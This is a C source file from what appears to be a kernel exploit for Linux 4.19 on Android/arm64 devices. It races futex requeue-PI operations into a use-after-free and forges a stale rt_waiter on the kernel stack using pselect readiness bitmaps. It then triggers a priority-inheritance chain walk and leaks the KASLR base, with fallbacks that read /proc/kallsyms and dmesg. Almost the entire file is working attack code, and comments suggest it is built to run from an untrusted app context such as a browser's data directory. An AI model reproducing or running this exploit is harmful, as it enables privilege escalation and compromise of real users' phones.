#include "common.h"

#define SLIDE_MAX_ATTEMPTS 2
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_TIMEOUT_SEC 0
#define SLIDE_PSELECT_TIMEOUT_USEC 200000
#define SLIDE_WAIT_SECONDS 5

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_owner_chain_done;
static atomic_int slide_owner_stop;
static atomic_int slide_owner_lock_ok;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_consume_inflight;

static int slide_pselect_waiter_shift(void) {
  const char *s = getenv("GHOSTLOCK_SLIDE_SHIFT");
  return s && *s ? atoi(s) : PSELECT_WAITER_WORD_SHIFT;
}

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return slide_pselect_waiter_shift() + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

/* alioth 4.19 pselect6 fd-bitmap (disassembly-verified 2026-09-13):
 * stack_fds at T-0x210 (core_sys_select add x19,sp,#0x50 under the
 * 0xa0+0x1c0 pselect chain), stale rt_waiter at T-0x198 (do_futex
 * sub x2,x29,#0xc8 -> rt_mutex_wait_proxy_lock, x29 = T-0x70-0x60).
 * 4.19 core_sys_select lays out six size=40 regions:
 *   in[0,40) out[40,80) ex[80,120) res_in[120,160) res_out[160,200)
 * so the stale waiter bytes 0-39 = res_in and bytes 40-79 = res_out:
 * THE WAITER IS THE READINESS-BITMAP OUTPUT, not the input sets.  The
 * 4.19-compatible encoding therefore builds every waiter qword from
 * per-fd readiness bits: bit b of res_in word w = read-ready(fd 64w+b),
 * bit b of res_out word w = write-ready(fd 64w+b).  do_select only
 * writes res bits for fds set in the input masks, so input bit >= res
 * bit for the same fd; fd types give all four (read,write) pairs:
 *   /dev/null=(1,1) /dev/zero=(1,0) pipe-write=(0,1) blocked-pipe-read=(0,0)
 * and every fd 0..319 must stay open so max_fds keeps nfds=320 on the
 * stack path (size=40 per set).
 *
 * Both stale rb nodes use TERMINAL form: __rb_parent_color = 1 (black
 * root, no parent) and NULL children.  4.19 __rb_erase_augmented then
 * only rewrites the tree root inside the fake page and never walks up
 * an unknown kernel parent chain.  lock/prio/task stay real so the
 * chain walk reads a consistent waiter. */

/* waiter qwords encoded into res_in (bytes 0-39) / res_out (bytes 40-79) */
static uint64_t slide_waiter_in_words[5];
static uint64_t slide_waiter_out_words[5];
void prepare_slide_select_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  /* waiter bytes 0-39 (res_in): tree_entry(pc,right,left) +
   * pi_tree_entry(pc,right), all terminal. */
  slide_waiter_in_words[0] = 1;  /* tree_entry.__rb_parent_color */
  slide_waiter_in_words[1] = 0;  /* tree_entry.rb_right */
  slide_waiter_in_words[2] = 0;  /* tree_entry.rb_left */
  slide_waiter_in_words[3] = 1;  /* pi_tree_entry.__rb_parent_color */
  slide_waiter_in_words[4] = 0;  /* pi_tree_entry.rb_right */

  /* waiter bytes 40-79 (res_out): pi_tree_entry.rb_left, task, lock,
   * prio, deadline. */
  slide_waiter_out_words[0] = 0;                       /* pi_tree.rb_left */
  slide_waiter_out_words[1] = SLIDE_INIT_TASK;         /* task */
  slide_waiter_out_words[2] = fake_lock;               /* lock */
  slide_waiter_out_words[3] = (uint64_t)FAKE_WAITER_PRIO; /* prio */
  slide_waiter_out_words[4] = 0;                       /* deadline */

  /* The input masks gate which res bits do_select may set: input bit
   * must be 1 wherever the encoded res bit is 1 (and may be 0 elsewhere,
   * which leaves the res bit at the zero_fd_set value). */
  for (int w = 0; w < 5; w++) {
    fdset_put_word(in, w, slide_waiter_in_words[w]);
    fdset_put_word(out, w, slide_waiter_out_words[w]);
  }
}

void fdset_put_bitmap_value(fd_set *set, int word, uint64_t value) {
  fdset_put_word(set, word, value);
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  /* One fd type per (read_ready, write_ready) pair encoded from the
   * waiter words; every fd 0..319 stays open so the kernel keeps
   * nfds=320 (max_fds clamp) and the stack buffer geometry. */
  int zero_fd = -1;
  int wonly_fd = -1;        /* (0,1): pipe write end, write-ready only */
  int blocked_fd = -1;      /* (0,0): empty pipe read end, never ready */
  int pipe_keep_write = -1;
  int null_fd = (int)syscall(SYS_openat, AT_FDCWD, "/dev/null", O_RDWR, 0);
  int pipe_fds[2] = {-1, -1};
  zero_fd = (int)syscall(SYS_openat, AT_FDCWD, "/dev/zero", O_RDONLY, 0);
  if (syscall(SYS_pipe2, pipe_fds, 0) == 0) {
    /* Keep the write end alive above NFDS so the blocked read end never
     * sees POLLHUP, and keep a write-end template for (0,1) fds. */
    pipe_keep_write = (int)fcntl(pipe_fds[1], F_DUPFD,
                                 SLIDE_PSELECT_NFDS + 64);
    wonly_fd = (int)fcntl(pipe_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 64);
    blocked_fd = (int)fcntl(pipe_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 64);
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    pipe_fds[0] = pipe_fds[1] = -1;
    if (pipe_keep_write < 0 && blocked_fd >= 0) {
      /* Without the kept write end a blocked read end would POLLHUP. */
      close(blocked_fd);
      blocked_fd = -1;
    }
    if (wonly_fd < 0 && pipe_keep_write >= 0) {
      close(pipe_keep_write);
      pipe_keep_write = -1;
    }
  }

  int stdio_backup[3] = {-1, -1, -1};
  for (int fd = 0; fd < 3; fd++) {
    stdio_backup[fd] = fcntl(fd, F_DUPFD, SLIDE_PSELECT_NFDS + 32);
  }
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (null_fd >= 0) {
      dup2(null_fd, fd);
    } else if (read_fd >= 0) {
      dup2(read_fd, fd);
    }
  }

  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    int want_read = FD_ISSET(fd, in);
    int want_write = FD_ISSET(fd, out);
    if (want_read && want_write) {
      if (null_fd >= 0) dup2(null_fd, fd);
    } else if (want_read) {
      if (zero_fd >= 0) dup2(zero_fd, fd);
    } else if (want_write) {
      if (wonly_fd >= 0) dup2(wonly_fd, fd);
    } else {
      if (blocked_fd >= 0) dup2(blocked_fd, fd);
    }
  }
  /* Restore stdio (the dup2 above may have closed fds 0-2). */
  for (int fd = 0; fd < 3; fd++) {
    if (stdio_backup[fd] >= 0) {
      dup2(stdio_backup[fd], fd);
    }
  }
  if (zero_fd >= 0) close(zero_fd);
  if (wonly_fd >= 0) close(wonly_fd);
  if (blocked_fd >= 0) close(blocked_fd);
  /* pipe_keep_write stays open above NFDS: keeps the dup2'd write ends
   * POLLOUT-clean and the blocked read ends POLLHUP-free for the
   * duration of the pselect. */
  /* null_fd stays open: it's our template fd for dup2'd copies. */
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  /* The upstream PI walk addresses these sets by the pselect frame layout.
   * Keeping them on the stack is required; moving them to BSS makes the
   * kernel write land in an unrelated frame/object. */
  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_select_fdsets(&in, &out, &ex);

  int stdio_backup[3] = {-1, -1, -1};
  for (int fd = 0; fd < 3; fd++) {
    stdio_backup[fd] = fcntl(fd, F_DUPFD, SLIDE_PSELECT_NFDS + 32);
    if (stdio_backup[fd] < 0) {
      pr_warning("slide pselect stdio backup fd=%d errno=%d\n", fd, errno);
    }
  }
  open_slide_selected_fds(&in, &out, &ex, high_read);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_consume_inflight, 0);

  struct timespec timeout = {
    .tv_sec = SLIDE_PSELECT_TIMEOUT_SEC,
    .tv_nsec = (long)SLIDE_PSELECT_TIMEOUT_USEC * 1000,
  };
  struct timespec *timeoutp = &timeout;

  pr_info("slide pselect setup shift=%d nfds=%d timeout=%d.%06ld\n",
          slide_pselect_waiter_shift(), SLIDE_PSELECT_NFDS,
          SLIDE_PSELECT_TIMEOUT_SEC, (long)SLIDE_PSELECT_TIMEOUT_USEC);
  atomic_store(&slide_consume_go, 1);
  errno = 0;

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  /* CRITICAL: after pselect returns, the fd-bitmap data is still on the
   * kernel stack at the stale waiter's address (below SP).  Any syscall
   * (dup2/usleep/write) would overwrite it.  Busy-wait (no syscalls) for
   * the consumer to see go=1, sleep PSELECT_ENTER_DELAY, and trigger the
   * PI chain walk before touching the stack again. */
  for (volatile int spin = 0; spin < 50000000; spin++) {
    if (atomic_load(&slide_consume_calls) > 0) break;
    __asm__ volatile("yield" ::: "memory");
  }
  /* Second phase: wait for the consumer's sched_setattr to RETURN
   * (inflight back to 0) before doing any syscall that could overwrite
   * the waiter data on this thread's kernel stack. */
  for (volatile int spin = 0; spin < 50000000; spin++) {
    if (atomic_load(&slide_consume_inflight) == 0 &&
        atomic_load(&slide_consume_calls) > 0) break;
    __asm__ volatile("yield" ::: "memory");
  }
  atomic_store(&slide_consume_go, 0);

  for (int fd = 0; fd < 3; fd++) {
    if (stdio_backup[fd] >= 0) {
      dup2(stdio_backup[fd], fd);
      close(stdio_backup[fd]);
    }
  }
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (SLIDE_CONSUME_USEC) {
      usleep(SLIDE_CONSUME_USEC);
    } else {
      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (seq == 1) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    atomic_store(&slide_consume_inflight, 1);
    errno = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = errno;
    /* Retry: the futex UAF race may not have left pi_blocked_on set on
     * the first attempt, and sched_setattr itself may transiently fail.
     * Multiple calls give more chances for the PI walk to fire. */
    for (int retry = 0; retry < 9; retry++) {
      if (ret == 0) {
        int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
        atomic_store(&slide_consume_sched_ok, sched_ok);
        break;
      }
      usleep(2000);
      errno = 0;
      ret = sched_setattr_tid(tid, ((calls + retry + 1) % 19) + 1);
      saved_errno = errno;
    }
    atomic_store(&slide_consume_stop, 1);
    atomic_store(&slide_consume_inflight, 0);
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  errno = 0;
  int futex_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  pr_info("slide waiter futex_requeue_pi ret=%d errno=%d\n",
          futex_ret, errno);

  slide_pselect_stack_copy();
  atomic_store(&slide_route_done, 1);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&slide_owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}


void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    atomic_store(&slide_owner_chain_done, 1);
    atomic_store(&slide_owner_stop, 1);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  /* DO NOT lock pi_chain here: that creates a PI cycle
   * (waiter→pi_target→owner→pi_chain→waiter) and makes the requeue
   * return -EDEADLK.  The owner just holds pi_target; the requeue
   * can then proxy-queue the waiter onto pi_target's rt_mutex. */
  atomic_store(&slide_owner_lock_ok, 1);
  atomic_store(&slide_owner_chain_done, 1);

  while (!atomic_load(&slide_owner_stop)) {
    sleep(1);
  }
  futex_op(&slide_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  if (!stext || stext < 0xffffff8000000000ULL || (stext & 0xffff) != 0) {
    pr_warning("slide implausible boot_id-derived_stext pid=%d "
               "leaked=%016llx off=%016llx stext=%016llx\n",
               getpid(), (unsigned long long)leaked,
               (unsigned long long)off, (unsigned long long)stext);
    return 0;
  }
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  /* 1MB stacks: a layout-mismatch kernel write must not reach the canary */
  pthread_attr_t big_stack;
  pthread_attr_init(&big_stack);
  pthread_attr_setstacksize(&big_stack, 1u << 20);
  SYSCHK(pthread_create(&waiter, &big_stack, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, &big_stack, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, &big_stack, slide_consumer_thread, NULL));
  pr_info("slide child threads up\n");

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  errno = 0;
  int requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &slide_f_pi_target, 0);
  pr_info("slide child requeue issued ret=%d errno=%d\n",
          requeue_ret, errno);

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_stop, 1);
  atomic_store(&slide_owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);
  pr_info("slide child route done, reading stext\n");

  /* Read back the SKB data: if the PI chain walk modified the prio field
   * (waiter->prio = task->prio), we can read the leaked 32-bit value. */
  uint32_t leaked_prio = ks_leak_readback();
  if (leaked_prio) {
    pr_success("KS_LEAK_VALUE 0x%08x\n", leaked_prio);
  }

  return slide_read_stext();
}

/* round-3: direct KASLR leak via /proc/kallsyms (safe; works when addresses
 * are not restricted - common on OPPO/ColorOS debug builds) */
static int slide_leak_from_kallsyms(void) {
  FILE *f = fopen("/proc/kallsyms", "r");
  if (!f) {
    return 0;
  }
  char line[256];
  uint64_t text = 0;
  while (fgets(line, sizeof(line), f)) {
    unsigned long long addr = 0;
    char type = 0;
    char name[128] = {0};
    if (sscanf(line, "%llx %c %127s", &addr, &type, name) == 3 &&
        strcmp(name, "_text") == 0) {
      text = (uint64_t)addr;
      break;
    }
  }
  fclose(f);
  if (text >= 0xffffff8000000000ULL && (text & 0xffff) == 0) {
    kaslr_base = text;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kallsyms-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }
  pr_warning("slide: /proc/kallsyms restricted or _text unusable\n");
  return 0;
}

/* round-3: dmesg "Kernel Offset" fallback */
static int slide_leak_from_dmesg(void) {
  FILE *f = popen("dmesg 2>/dev/null | grep 'Kernel Offset'", "r");
  if (!f) {
    return 0;
  }
  char line[256];
  int got = 0;
  unsigned long long off = 0;
  while (fgets(line, sizeof(line), f)) {
    if (sscanf(line, "%*[^:]Kernel Offset: 0x%llx", &off) == 1) {
      got = 1;
      break;
    }
  }
  pclose(f);
  if (!got) {
    pr_warning("slide: dmesg Kernel Offset unavailable\n");
    return 0;
  }
  kaslr_base = KIMAGE_TEXT_BASE + off;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  pr_success("slide-dmesg-ok pid=%d off=%016llx base=%016llx\n",
             getpid(), off, (unsigned long long)kaslr_base);
  return 1;
}

static void slide_guard_path(char *path, size_t size) {
  const char *home = getenv("GHOSTLOCK_HOME");
  if (!home || !home[0]) home = getenv("TMPDIR");
  if (!home || !home[0]) home = getenv("HOME");
  if (!home || !home[0]) home = "/data/local/tmp";
  /* Untrusted-app context cannot create files in /data/local/tmp; the
   * guard must be creatable, so fall back to the app's own data dir. */
  if (!strncmp(home, "/data/local/tmp", 15) && access("/data/local/tmp", W_OK) != 0)
    home = "/data/data/org.mozilla.firefox/files";
  snprintf(path, size, "%s/.ghostlock-slide-pselect.lock", home);
}

static int slide_guard_active(void) {
  char path[320];
  struct stat st;
  slide_guard_path(path, sizeof(path));
  return stat(path, &st) == 0;
}

static void slide_guard_arm(int attempt) {
  char path[320];
  slide_guard_path(path, sizeof(path));
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    pr_warning("slide guard arm failed path=%s errno=%d\n", path, errno);
    return;
  }

  char text[128];
  int n = snprintf(text, sizeof(text),
                   "slide attempt=%d pid=%d\n", attempt, getpid());
  if (n > 0) {
    ssize_t ignored = write(fd, text, (size_t)n);
    (void)ignored;
  }
  close(fd);
}

static void slide_guard_disarm(void) {
  char path[320];
  slide_guard_path(path, sizeof(path));
  unlink(path);
}

int slide_leak_kernel_base(void) {
  if (slide_leak_from_kallsyms() || slide_leak_from_dmesg()) {
    return 1;
  }
  if (slide_guard_active()) {
    pr_error("slide guard active: previous route died or panicked; "
             "remove the guard file to retry manually\n");
    return 0;
  }
#ifdef CFGOPS_4_19_STYLE
  pr_warning("slide: bootid rb-gadget values derived for 4.19 "
             "(LOGGERS_0_1=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
             (unsigned long long)SLIDE_LOGGERS_0_1,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA);
#endif
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    slide_guard_arm(attempt);
    if (!slide_guard_active()) {
      close(fds[0]);
      close(fds[1]);
      pr_error("slide guard not armed; refusing unsafe route retry\n");
      return 0;
    }
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (WIFEXITED(status)) {
      slide_guard_disarm();
    } else {
      pr_error("slide child died abnormally status=%d; guard kept\n", status);
      return 0;
    }
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
